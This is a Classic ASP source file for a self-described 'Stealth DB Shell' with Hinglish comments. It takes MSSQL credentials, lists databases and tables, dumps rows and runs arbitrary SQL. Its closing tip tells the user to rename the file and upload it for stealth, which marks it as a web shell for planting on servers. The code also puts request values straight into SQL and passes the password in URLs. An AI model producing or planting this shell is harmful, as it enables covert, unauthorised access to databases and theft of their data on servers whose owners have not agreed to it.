<%@ Language=VBScript %>
<%
' Stealth Classic ASP DB Manager - Credentials via Form (Lab only!)

Dim ConnStr, Conn, RS
Dim ServerName, DBName, UserName, PassWord, Action, Query, TableName

ServerName = Trim(Request.Form("server"))
DBName     = Trim(Request.Form("dbname"))
UserName   = Trim(Request.Form("user"))
PassWord   = Trim(Request.Form("pass"))
Action     = Request("act")
Query      = Request("query")
TableName  = Request("tbl")

' Agar form submit hua hai to connection try kar
If Request.Form("submit") <> "" And ServerName <> "" Then
    ' MSSQL OLEDB example (change provider if MySQL/SQLite)
    ConnStr = "Provider=SQLOLEDB;Data Source=" & ServerName & ";Initial Catalog=" & DBName & ";User ID=" & UserName & ";Password=" & PassWord & ";"
    ' MySQL ODBC example (if needed): "Driver={MySQL ODBC 8.0 Unicode Driver};Server=" & ServerName & ";Database=" & DBName & ";User=" & UserName & ";Password=" & PassWord & ";Option=3;"
    
    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        Response.Write "<div style='color:red; background:#300; padding:10px; border:1px solid red;'>Connection Failed: " & Err.Description & "<br>Check server IP/name, db name, user/pass.</div><br>"
    Else
        Response.Write "<div style='color:lime; background:#030; padding:10px; border:1px solid lime;'>Connected Successfully! (to " & ServerName & " / " & DBName & ")</div><br>"
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>DB Manager - Stealth Form</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; margin:20px;">

<h2>Classic ASP Stealth DB Shell (Credentials Form)</h2>
<p>Enter your database details below (MSSQL default - change ConnStr for MySQL etc.)</p>

<!-- Login Form -->
<form method="post">
    <b>Server / IP:</b> <input name="server" size="40" value="<%=Server.HTMLEncode(ServerName)%>" placeholder="localhost or 127.0.0.1 or IP"><br><br>
    <b>Database Name:</b> <input name="dbname" size="40" value="<%=Server.HTMLEncode(DBName)%>" placeholder="master or your_db"><br><br>
    <b>Username:</b> <input name="user" size="40" value="<%=Server.HTMLEncode(UserName)%>" placeholder="sa or root"><br><br>
    <b>Password:</b> <input type="password" name="pass" size="40" value="<%=Server.HTMLEncode(PassWord)%>"><br><br>
    <input type="submit" name="submit" value="Connect & Login">
</form>

<hr style="border-color:#333;">

<% If Conn Is Nothing Or Conn.State = 0 Then %>
    <p style="color:yellow;">Connect first to see databases/tables.</p>
<% Else %>
    <!-- Connected - Show options -->
    <h3>Connected! Now you can:</h3>
    
    <!-- List Databases (MSSQL) -->
    <h4>Databases</h4>
    <%
    Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE name NOT IN ('master','model','msdb','tempdb')")
    Do While Not RS.EOF
        Response.Write "<a href='?act=tables&dbname=" & Server.URLEncode(RS("name")) & "&server=" & Server.URLEncode(ServerName) & "&user=" & Server.URLEncode(UserName) & "&pass=" & Server.URLEncode(PassWord) & "' style='color:#ff0;'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>
    
    <!-- Custom Query -->
    <h4>Run Custom SQL</h4>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.HTMLEncode(ServerName)%>">
        <input type="hidden" name="dbname" value="<%=Server.HTMLEncode(DBName)%>">
        <input type="hidden" name="user" value="<%=Server.HTMLEncode(UserName)%>">
        <input type="hidden" name="pass" value="<%=Server.HTMLEncode(PassWord)%>">
        <input type="hidden" name="act" value="query">
        SQL: <input name="query" size="80" value="SELECT @@version"><br>
        <input type="submit" value="Execute">
    </form>
    
    <% If Action = "query" And Query <> "" Then %>
        <h4>Query Result:</h4>
        <%
        Set RS = Conn.Execute(Query)
        If Not RS.EOF Then
            Response.Write "<table border='1' style='border-color:#0f0; background:#111;'>"
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Dim rowCount : rowCount = 0
            Do While Not RS.EOF And rowCount < 100
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
                rowCount = rowCount + 1
            Loop
            Response.Write "</table>"
            If rowCount >= 100 Then Response.Write "<p>Showing first 100 rows only...</p>"
        Else
            Response.Write "<p style='color:yellow;'>Query executed (no rows or non-select query like INSERT/UPDATE).</p>"
        End If
        RS.Close
        %>
    <% End If %>
    
    <!-- Tables in selected DB -->
    <% If Action = "tables" And Request("dbname") <> "" Then %>
        <h4>Tables in <%=Server.HTMLEncode(Request("dbname"))%></h4>
        <%
        Conn.Execute "USE " & Request("dbname")
        Set RS = Conn.Execute("SELECT name FROM sysobjects WHERE xtype='U' ORDER BY name")
        Do While Not RS.EOF
            Response.Write "<a href='?act=browse&dbname=" & Server.URLEncode(Request("dbname")) & "&tbl=" & Server.URLEncode(RS("name")) & "&server=" & Server.URLEncode(ServerName) & "&user=" & Server.URLEncode(UserName) & "&pass=" & Server.URLEncode(PassWord) & "'>" & RS("name") & "</a><br>"
            RS.MoveNext
        Loop
        RS.Close
        %>
    <% End If %>
    
    <!-- Browse Table -->
    <% If Action = "browse" And Request("tbl") <> "" Then %>
        <h4>Browsing table: <%=Server.HTMLEncode(Request("tbl"))%></h4>
        <%
        Conn.Execute "USE " & Request("dbname")
        Set RS = Conn.Execute("SELECT TOP 100 * FROM [" & Request("tbl") & "]")
        If Not RS.EOF Then
            Response.Write "<table border='1' style='border-color:#0f0; background:#111;'>"
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Do While Not RS.EOF
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
            Loop
            Response.Write "</table>"
        Else
            Response.Write "Table empty or error."
        End If
        RS.Close
        %>
    <% End If %>
<% End If %>

<p style="color:#888;">Tips:<br>
- Server: localhost, 127.0.0.1, IP ya server name daal.<br>
- DB: master se shuru kar agar nahi pata.<br>
- User: sa ya domain\user (trusted ke liye blank user/pass try kar).<br>
- Password blank mat chhod agar required hai.<br>
- MySQL chahiye? ConnStr change kar (Driver wala).<br>
- Stealth: File rename kar ke upload kar.</p>

</body>
</html>

<%
If Not RS Is Nothing Then RS.Close
If Not Conn Is Nothing Then If Conn.State = 1 Then Conn.Close
Set RS = Nothing
Set Conn = Nothing
%>
